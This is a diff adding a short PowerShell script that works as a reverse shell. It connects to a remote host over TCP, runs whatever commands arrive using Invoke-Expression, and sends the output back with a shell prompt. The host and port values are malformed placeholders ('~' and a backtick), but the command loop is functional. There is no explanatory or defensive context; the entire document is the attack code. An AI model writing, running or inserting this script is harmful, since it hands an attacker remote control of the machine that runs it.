@@ -1,0 +1,12 @@
+$client = New-Object System.Net.Sockets.TCPClient("~",`)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    if($data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)){[void]$true}
+    if($sendback = (iex $data 2>&1 | Out-String )){[void]$true}
+    if($sendback2 = $sendback + "PS " + (pwd).Path + "> "){[void]$true}
+    if($sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)){[void]$true}
+    if($stream.Write($sendbyte,0,$sendbyte.Length)){[void]$true}
+    if($stream.Flush()){[void]$true}
+}
